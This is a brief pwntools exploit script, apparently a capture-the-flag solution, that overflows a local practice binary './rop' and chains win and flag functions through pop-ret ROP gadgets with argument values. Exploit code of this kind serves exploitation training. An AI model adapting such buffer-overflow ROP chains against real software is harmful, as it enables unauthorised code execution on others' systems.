#since win_function2 and flag function require arguments to be checked we need a ROP gadget that pops and returns

from pwn import * 

win_function  = 0x080485cb
win_function2 = 0x080485d8
flag_function = 0x0804862b
main_function = 0x0804873b
ret_address   = 0x080481ab
popret_gadget = 0x080485d6

p = process("./rop")

payload  = ""
payload  = "A" * 28
payload += p32(win_function)
payload += p32(win_function2)
payload += p32(popret_gadget)
payload += p32(0xBAAAAAAD)
payload += p32(flag_function)
payload += p32(popret_gadget)
payload += p32(0xDEADBAAD)


p.sendlineafter("> ",payload)
p.interactive()
